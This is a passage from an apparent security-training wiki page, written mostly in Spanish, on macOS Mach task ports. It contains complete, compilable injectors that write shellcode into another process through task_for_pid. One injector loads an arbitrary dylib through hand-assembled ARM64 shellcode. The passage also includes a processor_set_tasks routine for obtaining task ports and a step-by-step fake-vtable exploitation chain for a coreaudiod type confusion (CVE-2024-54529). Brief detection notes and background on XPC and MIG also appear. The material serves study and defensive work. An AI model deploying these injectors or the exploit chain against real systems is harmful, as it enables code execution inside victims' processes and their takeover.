[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

**Compila** el programa anterior y añade los **entitlements** necesarios para poder inyectar código con el mismo usuario (si no, tendrás que usar **sudo**).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Para que esto funcione en iOS necesitas el entitlement `dynamic-codesigning` para poder hacer ejecutable una memoria escribible.

### Dylib Injection in thread via Task port

En macOS, los **hilos** pueden manipularse mediante **Mach** o usando la **API `pthread` de posix**. El hilo que generamos en la inyección anterior se generó usando la API de Mach, por lo que **no es compatible con posix**.

Fue posible **inyectar un shellcode simple** para ejecutar un comando porque **no necesitaba funcionar con APIs compatibles con posix**, sino únicamente con Mach. Las **inyecciones más complejas** necesitarían que el **hilo** también fuera **compatible con posix**.

Por lo tanto, para **mejorar el hilo**, debería llamar a **`pthread_create_from_mach_thread`**, que **creará un pthread válido**. Entonces, este nuevo pthread podría **llamar a dlopen** para **cargar un dylib** desde el sistema, de modo que, en lugar de escribir nuevo shellcode para realizar distintas acciones, sea posible cargar librerías personalizadas.<sup>[[2]](#references)</sup>

Puedes encontrar **dylibs de ejemplo** en (por ejemplo, una que genera un log y luego permite escucharlo):


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

En esta técnica se hijackea un thread del proceso:


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Detección de Task Port Injection

Al llamar a `task_for_pid` o `thread_create_*`, se incrementa un contador en la estructura `task` del kernel, al que se puede acceder desde user mode llamando a `task_info(task, TASK_EXTMOD_INFO, ...)`.

## Exception Ports

Cuando ocurre una excepción en un thread, esta excepción se envía al exception port designado del thread. Si el thread no la gestiona, se envía a los exception ports de la task. Si la task no la gestiona, se envía al host port, que es gestionado por `launchd` (donde será reconocida). Esto se denomina exception triage.

Ten en cuenta que, normalmente, al final, si el informe no se gestiona correctamente, acabará siendo gestionado por el daemon `ReportCrash`. Sin embargo, es posible que otro thread de la misma task gestione la excepción; esto es lo que hacen herramientas de crash reporting como `PLCreashReporter`.

## Otros objetos

### Clock

Cualquier usuario puede acceder a la información del clock; sin embargo, para establecer la hora o modificar otros ajustes es necesario ser root.

Para obtener información, es posible llamar a funciones del subsistema `clock`, como `clock_get_time`, `clock_get_attributtes` o `clock_alarm`\
Para modificar valores, se puede utilizar el subsistema `clock_priv` con funciones como `clock_set_time` y `clock_set_attributes`.

### Processors and Processor Set

Las APIs de processor permiten controlar un único processor lógico mediante funciones como `processor_start`, `processor_exit`, `processor_info` y `processor_get_assignment`.

Además, las APIs de **processor set** proporcionan una forma de agrupar múltiples processors en un grupo. Es posible obtener el processor set predeterminado llamando a **`processor_set_default`**.\
Estas son algunas APIs interesantes para interactuar con el processor set:

- `processor_set_statistics`
- `processor_set_tasks`: Devuelve un array de send rights a todas las tasks dentro del processor set
- `processor_set_threads`: Devuelve un array de send rights a todos los threads dentro del processor set
- `processor_set_stack_usage`
- `processor_set_info`

Como se menciona en [**this post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), en el pasado esto permitía eludir la protección mencionada anteriormente para obtener task ports en otros procesos y controlarlos llamando a **`processor_set_tasks`**, obteniendo un host port en cada proceso.<sup>[[10]](#references)</sup>\
Actualmente se necesita root para utilizar esa función, y está protegida, por lo que solo podrás obtener estos ports en procesos no protegidos.<sup>[[10]](#references)</sup>

Puedes probarlo con:

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Main part of the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; indirect call through vtable slot
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
